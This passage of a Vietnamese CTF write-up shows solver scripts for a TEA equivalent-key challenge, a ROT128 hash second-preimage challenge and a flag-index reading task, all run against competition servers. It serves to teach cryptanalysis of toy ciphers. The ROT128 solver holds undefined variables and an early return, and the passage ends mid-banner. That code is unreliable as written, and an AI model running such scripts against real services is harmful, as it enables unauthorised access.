        except:
            print('Nope.')
            exit()
            
        ciphertexts.append(ct)

    print(f'Wait, really? {FLAG}')


if __name__ == '__main__':
    run()
```

---

Khi nhìn vào source code mình thấy Iv đã được cố định nên mình sẽ đi tìm Iv vì nó sẽ giúp bài toán trở nên dễ dàng hơn.
Ngoài ra vì các ciphertext và key ta gửi sẽ được mã hóa CBC mà ta đã biết trước được msg nên mình có hướng tìm iv như sau.

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/f7c12134-d90f-4e65-88fa-5f06421d5943)

$c_i = e(p_i \oplus c_{i-1}), c_{-1} = IV$

nên từ đó ta có decrypt(enc) = iv $\oplus$ msg[:8] nên ta có iv = msg[:8] $\oplus$ decrypt(enc)

ĐĐể giải mã enc mình sử dụng code từ bài trước để giải mã enc với key mà mình gửi( mình gửi key là 00 cho dễ tính).

```py

from pwn import *

from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from enum import Enum
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b

def decrypt_block(key, ct):
    m0 = b2l(ct[:4])
    m1 = b2l(ct[4:])
    msk = (1 << 32) - 1

    DELTA = 0x9e3779b9
    s = 0xc6ef3720

    for i in range(32):
        m1 -= ((m0 << 4) + key[2]) ^ (m0 + s) ^ ((m0 >> 5) + key[3])
        m1 &= msk
        m0 -= ((m1 << 4) + key[0]) ^ (m1 + s) ^ ((m1 >> 5) + key[1])
        m0 &= msk
        s -= DELTA
    m = ((m0 << 32) + m1) & ((1 << 64) - 1)
    return l2b(m)

def main() -> None:

    s = process(["python3", "server.py"])
    s.recvuntil(b"message: ")

    msg = bytes.fromhex(s.recvline().decode())

    print(s.recvuntil(b"(in hex) :").decode())

    s.sendline(b"00" * 8)
    print(s.recvuntil(b"(in hex) : ").decode())
    s.sendline(b"00" * 16)
    print(s.recvuntil(b", but ").decode())
    tmp = bytes.fromhex((s.recvuntil(b" ").decode())[:-1])
    print(tmp)

    iv = xor(decrypt_block(b"\x00" * 16,tmp[:8]), msg[:8])
    print(bytes.fromhex(iv.hex()))

    # \r\xdd\xd2w<\xf4\xb9\x08
if __name__ == "__main__":
    main()
```

Từ đó mình có được iv. Bài toán của bài này là ta phải tìm được 4 key khác nhau và không được lặp lại sao cho nó có $e_{k_1}(m) = e_{k_2}(m) = e_{k_3}(m) = e_{k_4}(m)$

Bây giừo ta hãy nhìn qua hàm mã hóa của nó:

```py
        m0 += ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
        m1 += ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
```

Nhờ vào thông tin từ [này](https://link.springer.com/chapter/10.1007/3-540-68697-5_19) và [này](https://www.tayloredge.com/reference/Mathematics/VRAndem.pdf). Điều mình thấy là ta chỉ cần tìm các $k_i^{'}$ sao cho thỏa mãn:

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/2ff71678-1eff-437d-a8db-0ac6f1f5e639)

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/f6766431-40cd-49d9-9627-fc808f50d205)

Bây giờ ta chỉ cần code theo nữa là xong :k.

```py

from pwn import *
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from enum import Enum

class Mode(Enum):
    ECB = 0x01
    CBC = 0x02

class Cipher:
    def __init__(self, key, iv=None):
        self.BLOCK_SIZE = 64
        self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)]
        self.DELTA = 0x9e3779b9
        self.IV = iv
        if self.IV:
            self.mode = Mode.CBC
        else:
            self.mode = Mode.ECB
    
    def _xor(self, a, b):
        return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b))

    def encrypt(self, msg):
        msg = pad(msg, self.BLOCK_SIZE//8)
        blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)]
        
        ct = b''
        if self.mode == Mode.ECB:
            for pt in blocks:
                ct += self.encrypt_block(pt)
        elif self.mode == Mode.CBC:
            X = self.IV
            for pt in blocks:
                enc_block = self.encrypt_block(self._xor(X, pt))
                ct += enc_block
                X = enc_block
        return ct

    def encrypt_block(self, msg):
        m0 = b2l(msg[:4])
        m1 = b2l(msg[4:])
        K = self.KEY
        msk = (1 << (self.BLOCK_SIZE//2)) - 1

        s = 0
        for i in range(32):
            s += self.DELTA
            m0 += ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
            m0 &= msk
            m1 += ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
            m1 &= msk
        
        m = ((m0 << (self.BLOCK_SIZE//2)) + m1) & ((1 << self.BLOCK_SIZE) - 1) # m = m0 || m1

        return l2b(m)
def get_keys() -> list:

    pad = l2b(1 << 31)

    key = os.urandom(16)

    keys = [key[i:i+4] for i in range(0, len(key), 4)]

    key_0 = keys[0] + keys[1] + keys[2] + keys[3]
    key_1 = xor(keys[0], pad) + xor(keys[1], pad) + keys[2] + keys[3]
    key_2 = keys[0] + keys[1] + xor(keys[2], pad) + xor(keys[3], pad)
    key_3 = xor(keys[0], pad) + xor(keys[1], pad) + xor(keys[2], pad) + xor(keys[3], pad)

    assert all([Cipher(key_0).encrypt(b"00" * 8) == Cipher(key).encrypt(b"00" * 8) for key in [key_1, key_2, key_3]])

---

-> Code 

```py
from pwn import *

def main() -> None:
    i = 0
    s = remote("83.136.252.194", 57105)

    while True:
        s.recvuntil(b"Enter an index: ")

        s.sendline(f"{i}".encode())
        
        s.recvuntil(f"at Index {i}: ".encode())
        print(s.recvline()[:-1].decode(), end="", flush=True)
        i += 1

if __name__ == "__main__":
    main()
```


### 10. ROT128

---

**_TASK:_**

```py
import random, os, signal
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l
from secret import FLAG

ROUNDS = 3
USED_STATES = []
_ROL_ = lambda x, i : ((x << i) | (x >> (N-i))) & (2**N - 1)
N = 128

def handler(signum, frame):
    print("\n\nToo slow, don't try to do sneaky things.")
    exit()

def validate_state(state):
    if not all(0 < s < 2**N-1 for s in user_state[-2:]) or not all(0 <= s < N for s in user_state[:4]):
        print('Please, make sure your input satisfies the upper and lower bounds.')
        return False
    
    if sorted(state[:4]) in USED_STATES:
        print('You cannot reuse the same state')
        return False
    
    if sum(user_state[:4]) < 2:
        print('We have to deal with some edge cases...')
        return False

    return True

class HashRoll:
    def __init__(self):
        self.reset_state()

    def hash_step(self, i):
        r1, r2 = self.state[2*i], self.state[2*i+1]
        return _ROL_(self.state[-2], r1) ^ _ROL_(self.state[-1], r2)

    def update_state(self, state=None):
        if not state:
            self.state = [0] * 6
            self.state[:4] = [random.randint(0, N) for _ in range(4)]
            self.state[-2:] = [random.randint(0, 2**N) for _ in range(2)]
        else:
            self.state = state
    
    def reset_state(self):
        self.update_state()

    def digest(self, buffer):
        buffer = int.from_bytes(buffer, byteorder='big')
        m1 = buffer >> N
        m2 = buffer & (2**N - 1)
        self.h = b''
        for i in range(2):
            self.h += int.to_bytes(self.hash_step(i) ^ (m1 if not i else m2), length=N//8, byteorder='big')
        return self.h

print('Can you test my hash function for second preimage resistance? You get to select the state and I get to choose the message ... Good luck!')

hashfunc = HashRoll()

for _ in range(ROUNDS):
    print(f'ROUND {_+1}/{ROUNDS}!')

    server_msg = os.urandom(32)
    hashfunc.reset_state()
    server_hash = hashfunc.digest(server_msg)
    print(f'You know H({server_msg.hex()}) = {server_hash.hex()}')

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(2)

    try:
        user_state = input('Send your hash function state (format: a,b,c,d,e,f) :: ').split(',')
    except:
        exit()

    try:
        user_state = list(map(int, user_state))

        if not validate_state(user_state):
            print("The state is not valid! Try again.")
            exit()

        hashfunc.update_state(user_state)

        if hashfunc.digest(server_msg) == server_hash:
            print(f'Moving on to the next round!')
            USED_STATES.append(sorted(user_state[:4]))
        else:
            print('Not today.')
            exit()
    except:
        print("The hash function's state must be all integers.")
        exit()
    finally:
       signal.alarm(0)

print(f'Uhm... how did you do that? I thought I had cryptanalyzed it enough ... {FLAG}')
```

---

Đầu tiên ta thấy có một hàm Hashroll được tạo ra và sử dụng tới cuối thử thách, ta phải gửi cho server tổng cộng 3 cái state có chung hash với state ngẫu nhiên của chall.  

+ Máy chủ tạo một thông báo 32 byte ngẫu nhiên và tính toán hàm băm của máy chủ bằng hàm băm HashRoll. Chúng ta sẽ đi sâu vào nó sau.
+ Ta chỉ có 2 giây để tính toán và gửi lại server
+ cuối cùng ta phải cung cấp state khác để bằng với mã hóa của thử thách.

Từ đó ta phải tìm một state khác sao cho $H_{s'}(M) = H_{s}(M)$ với s' khác s là một random sate của sever và M là một chuỗi bytes ngẫu nhiên. Ngoài ta S được định nghĩa như sau: $s_1, s_2, s_3, s_4, s_5, s_6$ với $s_1$ đến $s_4$ trong khoảng 0 -> 127 và $s_5, s_6$ trong khoảng [0, 2 ^ x - 1] trong khi đó s chỉ được gửi đi một S khác nhau mỗi lần và tổng của 2 giá trị đầu lớn hơn 2(để nó k bị gửi đi với toàn các số 0).

Tổng quát $H = h_1 || h_2$ và $M = m_1 || m_2$ và $h_1 = R(x, r_1) \oplus R(y, r_2) \oplus m_1$, $h_2 = R(x, r_3) \oplus R(y, r_4) \oplus m_2$

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/ac5501e8-7d61-4d79-a6f2-34404712973b)

what's the hell! z3 fail ?

Từ đó ta phải tìm $h_1^{'} = h_1$, $h_2^{'} = h_2$



Dựa vào cái [này](https://crypto.stackexchange.com/questions/107005/a-problem-related-to-two-bitwise-sums-of-rotations-of-two-different-bitstrings)

ta có hướng tìm như sau:

XOR hai phần tử trong một trường GF chính là phép cộng của đa thức. Ví dụ: $7 + 5 = (x^2 + x + 1) + (x^2 + 1) = 2x^2 + x + 2 = x \equiv 2$

Từ đó chúng ta phải tìm lời giả cho $x,y, s_i$. Chuyển vế $m_1, m_2$ sang phía bên kia và nhận được: $h_1 \oplus m_1 = R(x, r_1) \oplus R(y, r_2) = H_1\ h_2 \oplus m_2 = R(x, r_3) \oplus R(y, r_4 ) = H_2$ Lúc này, thêo như bài viết ở trên, chúng ta có thể đặt $r_1 = r_2 = r_3 = 0$

  Và $r_4 = 1$. Do đó, $H_1 = x \oplus y\ H_2 = x \oplus z * y$ Sau đó, chúng ta có thể XOR hai vế và nhận được: $(z \oplus 1)y = H_1 \oplus H_2$ Như $z \oplus 1$  là một yếu tố của $H_1 \oplus H_2$, thì một nghiệm là y. $y = \frac{H_1 \oplus H_2}{z \oplus 1}$ Khi đó chúng ta có thể giải được $H_1 \oplus H_2$ như: $x = H_1 \oplus y$ Từ đó, ta có đáp án $z \oplus 1$.

```py

import itertools
import math
from pwn import *
from Crypto.Util.number import *

N = 128

F.<w> = GF(2 ^ 128)
PR.<x> = PolynomialRing(GF(2))

def int2pre(i: int):

    coeffs = list(map(int, bin(i)[2:].Zfill(N)))[::-1]
    return PR(coeffs)

def pre2int(p: list):

    coeffs = p.coefficients(sparse = False)
    return sum((2 ^ i) * int(coeffs[i]) for i in range(len(coeffs)))

def get_all_possible_candidates():

    powers = "0123456789"
    cands = itertools.product(powers, repeat = 2)
    d = {}
    for cand in cands:
        r2 = int(cand[0])
        r4 = int(cand[1])

        s = 2 ** r2 + 2 ** r4
        d[s] = sorted([r2, r4])
    
    return d

def extract_r2_r4_candicate(B, d, visited):
    factors = sorted([F(i ^ j).to_integer() for i, j in list(B.factors())])

    for factor in factors:
        if factor in visited:
            continue
        
        if factor in d:

            r2, r4 = d(factor)
            visited.append(factor)
            return r2, r4

def extract_r1_r3_candicates(number):

    num_fators = sorted([F(i ^ j).to_integer() for i, j in list(number.factors())])

    cands = []
    for factor in factors:
        r1 = int(math.log2(factor))
        if 2 ^ r1 == factor:
            r3 = r1
            cands.append((r1, r3))

    return cands



def extract_m1_m2(server_msg):

    m1 = server_msg >> N
    m2 = server_msg & (2**N - 1)
    return m1, m2

def compute_H1_H2(server_msg, server_hash):

	m1, m2 = extract_m1_m2(server_msg)
	H1 = bytes_to_long(server_hash[:16]) ^^ m1
    H2 = bytes_to_long(server_hash[16:]) ^^ m2
    return H1, H2

def send_state(io, r1, r2, r3, r4, x, y):
	io.sendlineafter(b' :: ', f'{r1},{r2},{r3},{r4},{x},{y}'.encode())

def main() -> None:
    # 83.136.254.223:46148

    s = connect("83.136.254.223", 46148)

    d = get_all_possible_candidates()

    used_states = []
    visited = []

    for i in range(3):

        io.recvuntil(b'H('))

        server_msg = int(io.recv(64), 16)
        io.recvuntil(b' = ')
        server_hash = l2b(int(io.recvline().strip().decode(), 16))
        return server_msg, server_hash

        H1, H2 = compute_H1_H2(server_msg, server_hash)

        B = int2pre(H1) + int2pre(H2)

        r2, r4 = extract_r2_r4_candicate(B, d, visited)

        y = B / int2pre(2 ^ r2 + 2 ^ r4)
        nember = int2pre(H1) - y * int(2 ^ r2)

        r1_r3 = extract_r1_r3_candicates(number)

        for (r1, r3) in r1_r3:

            x = number / int(2 ^ r1)

            x = pre2int(PR(x))
            y = pre2int(PR(y))

            if sorted([r1, r2, r3, r4]) in used_states:
                continue

            if H1 == R(x, r1) ^^ R(y, r2) and H2 == R(x, r3) ^^ R(y, r4):
                state = r1, r2, r3, r4, x, y
                
                break

        r1, r2, r3, r4, x, y = state
        send_state(io, r1, r2, r3, r4, x, y)
        done += 1
        used_states.append(sorted([r1, r2, r3, r4]))
        print(f'round {done} done!')        


if __name__ == "__main__":
    main()

```

## II. Blockchain

### 1. Russian Roulette
Lmao Blockchain nhuw c meo hieu j


## III. MISC

### 1. Character

---
**_TASK_**

Khi ta gửi cho server một số ta sẽ nhận lại được flag tại vị trí đó.

---
```py
from pwn import *

def main() -> None:
    i = 0
    s = remote("83.136.252.194", 57105)

    while True:
        s.recvuntil(b"Enter an index: ")

        s.sendline(f"{i}".encode())
        
        s.recvuntil(f"at Index {i}: ".encode())
        print(s.recvline()[:-1].decode(), end="", flush=True)
        i += 1

if __name__ == "__main__":
    main()
    
```

### 2. Unbreakable

---
**_SOURCE:_**

```py
#!/usr/bin/python3

banner1 = '''
                   __ooooooooo__
              oOOOOOOOOOOOOOOOOOOOOOo
          oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
       oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
     oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
   oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
  oOOOOOOOOOOO*  *OOOOOOOOOOOOOO*  *OOOOOOOOOOOOo
 oOOOOOOOOOOO      OOOOOOOOOOOO      OOOOOOOOOOOOo
 oOOOOOOOOOOOOo  oOOOOOOOOOOOOOOo  oOOOOOOOOOOOOOo
oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
oOOOO     OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO     OOOOo
oOOOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOOOo
 *OOOOO  OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO  OOOOO*
 *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
  *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*
   *OOOOOOo  *OOOOOOOOOOOOOOOOOOOOOOO*  oOOOOOO*
     *OOOOOOOo  *OOOOOOOOOOOOOOOOO*  oOOOOOOO*
       *OOOOOOOOo  *OOOOOOOOOOO*  oOOOOOOOO*      
          *OOOOOOOOo           oOOOOOOOO*      
              *OOOOOOOOOOOOOOOOOOOOO*          
                   ""ooooooooo""
'''

banner2 = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠉⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣼⣰⢷⡤⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠉⣿⠈⢻⡀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢹⡀⠀⢷⡀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠘⣧⠀⢸⡇⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠶⠾⠿⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠘⣦⠀⣇⠀⠘⣿⣤⣶⡶⠶⠛⠛⠛⠛⠶⠶⣤⣾⠋⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠘⣦⣿⠀⠀⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡟⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣦⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠁⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⢰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠶⠛⠉⢀⣄⠀⠀⠀⢀⣿⠃⠀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣠⡶⠟⠋⠁⠀⠀⠀⣼⡇⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⣀⣀⣠⠿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀⠀⣀⣤⣤⣿⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⢻⡇⠀⠀⠀⠀⢠⣄⠀⢶⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠟⠛⠋⠹⢿⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀⠘⢷⡄⠙⣧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⠁⠀⠀⠀⠀⠘⢸⡀⠀⠿⠀⠀⠀⣠⣤⣤⣄⣄⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣀⡀⠀⠀⠀⢸⡟⠻⣿⣦⡀⠀⠀⠀⠙⢾⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⣴⡏⠁⠀⠀⠹⣷⠀⠀⠀⠀⣠⡿⠋⠀⠀⠈⣷⠀⠀⠀⣾⠃⠀⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡆⠀⠀⠀⠘⢷⣄⡀⣀⣠⣿⠀⠀⠀⠀⠻⣧⣄⣀⣠⣴⠿⠁⠀⢠⡟⠀⠀⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡽⣦⡀⣀⠀⠀⠉⠉⠉⠉⠀⢀⣀⣀⡀⠀⠉⠉⠉⠁⠀⠀⠀⣠⡿⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠈⢿⣿⣧⣄⠀⠀⠰⣦⣀⣭⡿⣟⣍⣀⣿⠆⠀⠀⡀⣠⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣤⣽⣷⣤⣤⠀⠀⠀⠀⠀
⠀⢀⣿⡆⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⢀⣴⠖⠋⠁⠈⠻⣿⣿⣿⣶⣶⣤⡉⠉⠀⠈⠉⢉⣀⣤⣶⣶⣿⣿⣿⠃⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠉⠻⣷⣄⠀⠀⠀
⠀⣼⡏⣿⠀⢀⣤⠽⠖⠒⠒⠲⣤⣤⡾⠋⠀⠀⠀⠀⠀⠈⠈⠙⢿⣿⣿⣿⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⣀⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⠀⠀
⢰⣿⠁⢹⠀⠈⠀⠀⠀⠀⠀⠀⠀⣿⠷⠦⠄⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⢀⣠⠶⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀
⣸⡇⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠉⠉⠛⠋⠉⠙⢧⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆
⣿⡇⠀⠀⠈⠆⠀⠀⣠⠟⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⣸⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡇
⢻⣧⠀⠀⠀⠀⠀⣸⣥⣄⡀⠀⠀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠂⠀⠀⠀⠀⠀⠀⣿⡇
⢸⣿⣦⠀⠀⠀⠚⠉⠀⠈⠉⠻⣾⣿⡏⢻⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣟⢘⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠐⡟⠀⠀⠀⠀⠀⠀⢀⣿⠁
⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣇⠈⠻⠷⠦⠤⣄⣀⣀⣀⣀⣠⣿⣿⣄⠀⠀⠀⠀⠀⣠⡾⠋⠄⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⣸⠟⠀
⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⣔⠢⠤⠤⠀⠀⠈⠉⠉⠉⢤⠀⠙⠓⠦⠤⣤⣼⠋⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⠀⢰⠏⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀
⠀⢻⣷⣖⠦⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠈⢳⡀⠈⠛⢦⣀⡀⠀⠀⠘⢷⠀⠀⠀⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⣠⠏⠀⠀⠀⠀⣀⣴⡿⠋⠀⠀⠀
⠀⠀⠙⠻⣦⡀⠈⠛⠆⠀⠀⠀⣠⣤⡤⠀⠿⣤⣀⡙⠢⠀⠀⠈⠙⠃⣠⣤⠾⠓⠛⠛⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡴⠞⠁⢀⣠⣤⠖⢛⣿⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢷⣤⡁⠀⣴⠞⠁⠀⠀⠀⠀⠈⠙⠿⣷⣄⣀⣠⠶⠞⠋⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠞⠋⠁⠀⢀⣾⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣧⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣤⣀⣀⠀⠀⠈⠂⢀⣤⠾⠋⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⣠⠎⣠⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⣦⠀⠀⠀⠀⠀⠀⠀⣿⣇⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢐⣯⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠸⣆⠀⠀⠲⣆⠀⠀⢸⣿⣶⣮⣉⡙⠓⠒⠒⠒⠒⠒⠈⠉⠁⠀⠀⠀⠀⠀⢀⣶⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠷⠾⠷⣦⣾⠟⠻⠟⠛⠁⠀⠈⠛⠛⢿⣶⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⣨⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
